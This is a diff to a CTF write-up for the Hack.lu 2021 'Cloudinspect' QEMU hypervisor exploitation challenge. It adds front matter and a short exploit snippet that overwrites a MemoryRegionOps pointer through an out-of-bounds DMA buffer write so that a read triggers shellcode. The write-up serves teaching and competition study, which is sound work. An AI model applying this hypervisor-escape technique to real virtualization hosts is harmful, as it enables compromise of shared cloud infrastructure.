@@ -1,4 +1,10 @@
-﻿# CloudInspect
+﻿+++                                                                               
+title = "[Hack.lu 2021 - pwn] Cloudinspect"
+tags = ["ctf", "ret2school", "hack.lu", "nasm", "pwn", "heap", "arbitrary read", "arbitrary write", "hypervisor", "qemu", "2021"]
+date = "2021-11-07"
++++
+
+# CloudInspect
 
 CloundInpect was a hypervisor exploitation challenge I did for the [Hack.lu event](https://flu.xxx).
 I didn't succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
@@ -557,6 +563,9 @@ We just have to replace the original `CoudInspect.mmio.ops` pointer to a pointer
 Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original `CoudInspect.mmio.ops` pointer to read the flag at `leak_rwx+0x5000`! Which gives:
 
 ```c
+write_dmabuf(-0xd0, leak_rwx+0x2000);
+// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
+
 ioread(0x37); // trigger the read handler we control, then the shellcode is 
 // executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)
 
@@ -593,7 +602,7 @@ flag: flag{cloudinspect_inspects_your_cloud_0107}
 ```
 
 Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
-You can the finale exploit [here](https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c).
+You can the final exploit [here](https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c).
 
 ## Resources
 
